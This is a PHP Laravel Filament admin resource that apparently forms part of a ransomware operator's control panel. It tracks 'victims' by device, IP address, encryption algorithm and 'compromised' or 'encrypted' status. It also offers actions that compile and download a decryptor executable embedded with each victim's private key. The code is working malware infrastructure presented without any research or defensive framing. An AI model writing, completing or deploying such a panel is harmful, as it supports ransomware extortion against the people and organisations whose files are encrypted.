<?php

namespace App\Filament\Admin\Resources;

use App\Filament\Admin\Resources\VictimResource\Pages;
use App\Models\Victim;
use App\Services\PayloadService;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Actions\Action;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Table;
use Illuminate\Support\Facades\Storage;

class VictimResource extends Resource
{
    protected static ?string $model = Victim::class;

    protected static bool $shouldRegisterNavigation = false;

    protected static ?string $navigationIcon = 'heroicon-o-users';

    protected static ?string $navigationLabel = 'Victims';

    protected static ?string $navigationGroup = 'System';

    protected static ?int $navigationSort = 2;

    public static function table(Table $table): Table
    {
        return $table
            ->query(Victim::query())
            ->defaultSort('last_seen', 'desc')
            ->columns([
                TextColumn::make('id')
                    ->label('ID')
                    ->sortable()
                    ->visibleFrom('xl'),
                TextColumn::make('hostname')
                    ->label('Device')
                    ->searchable()
                    ->weight('bold')
                    ->placeholder('—'),
                TextColumn::make('ip_address')
                    ->label('IP Address')
                    ->searchable(),
                TextColumn::make('os')
                    ->label('Platform')
                    ->badge()
                    ->placeholder('—')
                    ->visibleFrom('sm'),
                TextColumn::make('encryption_type')
                    ->label('Algorithm')
                    ->badge()
                    ->color('info')
                    ->formatStateUsing(fn (string $state): string => strtoupper($state)),
                TextColumn::make('status')
                    ->label('Status')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'compromised' => 'danger',
                        'online' => 'success',
                        'resolved' => 'success',
                        'encrypted' => 'warning',
                        default => 'gray',
                    }),
                TextColumn::make('last_seen')
                    ->label('Last Seen')
                    ->dateTime()
                    ->placeholder('—')
                    ->visibleFrom('md'),
                TextColumn::make('created_at')
                    ->label('Registered')
                    ->dateTime()
                    ->visibleFrom('lg'),
            ])
            ->filters([
                //
            ])
            ->actions([
                // زر توليد أداة فك التشفير المخصصة للضحية
                Action::make('generate_decryptor')
                    ->label('Build Decryptor')
                    ->icon('heroicon-o-wrench-screwdriver')
                    ->color('danger')
                    ->requiresConfirmation()
                    ->modalHeading('Generate Custom Decryptor')
                    ->modalDescription('This will compile a targeted decryption utility embedded with the victim\'s specific key.')
                    ->action(function (Victim $record, PayloadService $payloadService) {
                        $filePath = $payloadService->createDecryptorPayload($record);

                        if (! $filePath) {
                            Notification::make()
                                ->title('Error: Encryption key or Private Key is missing for this victim.')
                                ->danger()
                                ->send();

                            return;
                        }

                        Notification::make()
                            ->title('Decryptor built and compiled successfully!')
                            ->success()
                            ->send();
                    }),

                // زر تحميل الأداة بعد إنشائها
                Action::make('download_decryptor')
                    ->label('Download')
                    ->icon('heroicon-o-arrow-down-tray')
                    ->color('success')
                    ->url(fn (Victim $record): string => Storage::url('decryptors/decryptor_'.$record->id.'.exe'))
                    ->openUrlInNewTab()
                    ->visible(fn (Victim $record): bool => Storage::exists('public/decryptors/decryptor_'.$record->id.'.exe')),

                Action::make('decrypt_help')
                    ->label('Decrypt Info')
                    ->icon('heroicon-o-key')
                    ->color('warning')
                    ->iconButton()
                    ->authorize(fn (Victim $record): bool => static::canView($record))
                    ->modalHeading('Decryption Instructions')
                    ->modalDescription('Use this key with the client decryption utility to restore target files.')
                    ->modalContent(fn (Victim $record) => view('filament.admin.modals.decrypt-key', ['record' => $record])),

                Tables\Actions\EditAction::make()
                    ->iconButton()
                    ->url(fn (Victim $record): string => static::getUrl('edit', ['record' => $record]))
                    ->authorize(fn (Victim $record): bool => static::canEdit($record)),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListVictims::route('/'),
            'create' => Pages\CreateVictim::route('/create'),
            'edit' => Pages\EditVictim::route('/edit/{record}'),
        ];
    }
}
